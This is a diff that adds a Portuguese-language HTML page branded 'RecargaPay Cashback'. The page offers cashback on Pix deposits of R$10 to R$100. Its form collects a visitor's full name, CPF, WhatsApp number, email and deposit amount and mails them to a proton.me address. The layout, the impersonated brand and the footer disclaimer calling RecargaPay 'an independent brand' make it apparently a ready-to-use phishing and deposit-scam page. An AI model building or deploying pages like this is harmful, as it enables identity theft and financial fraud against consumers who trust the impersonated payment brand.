@@ -1,0 +1,100 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RecargaPay Cashback</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #e6f2ff;
+      color: #222;
+    }
+    header {
+      text-align: center;
+      background: white;
+      padding: 40px 0 10px;
+    }
+    .logo-img {
+      max-width: 280px;
+      height: auto;
+    }
+    .container {
+      max-width: 600px;
+      margin: 30px auto;
+      text-align: center;
+    }
+    h1 {
+      font-size: 24px;
+      color: #004aad;
+    }
+    .btn {
+      background-color: #ff9900;
+      color: white;
+      padding: 15px 25px;
+      margin: 15px 10px;
+      border-radius: 10px;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 18px;
+      transition: 0.3s;
+    }
+    .btn:hover {
+      background-color: #cc7a00;
+    }
+    input[type="text"], input[type="email"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    form {
+      margin-top: 20px;
+    }
+    footer {
+      text-align: center;
+      padding: 30px 20px;
+      background-color: #f0f0f0;
+      color: #555;
+      font-size: 13px;
+    }
+    footer a {
+      color: #004aad;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="logo.png" alt="Logo RecargaPay" class="logo-img">
+  </header>
+
+  <div class="container">
+    <a class="btn" href="#">Depositar R$10</a>
+    <a class="btn" href="#">Depositar R$25</a>
+    <a class="btn" href="#">Depositar R$50</a>
+    <a class="btn" href="#">Depositar R$100</a>
+    <a class="btn" href="#cadastro">Cadastrar CPF e Receber Cashback</a>
+
+    <div id="cadastro">
+      <h1>Cadastro para Cashback</h1>
+      <form action="mailto:recargapay@proton.me" method="post" enctype="text/plain">
+        <input type="text" name="Nome" placeholder="Nome completo" required><br>
+        <input type="text" name="CPF" placeholder="CPF" required><br>
+        <input type="text" name="WhatsApp" placeholder="WhatsApp" required><br>
+        <input type="email" name="Email" placeholder="E-mail" required><br>
+        <input type="text" name="Valor" placeholder="Valor depositado (ex: R$50,00)" required><br>
+        <input type="submit" class="btn" value="Enviar dados e solicitar cashback">
+      </form>
+    </div>
+  </div>
+
+  <footer>
+    <p>Esta plataforma é destinada à distribuição promocional de cashback mediante depósitos via Pix. Ao utilizar este site, você concorda com nossos <a href="#">termos de uso</a> e <a href="#">política de privacidade</a>.</p>
+    <p>CNPJ 11.275.560/0001-75 – Todos os direitos reservados © 2025. RecargaPay é uma marca independente.</p>
+  </footer>
+</body>
+</html>
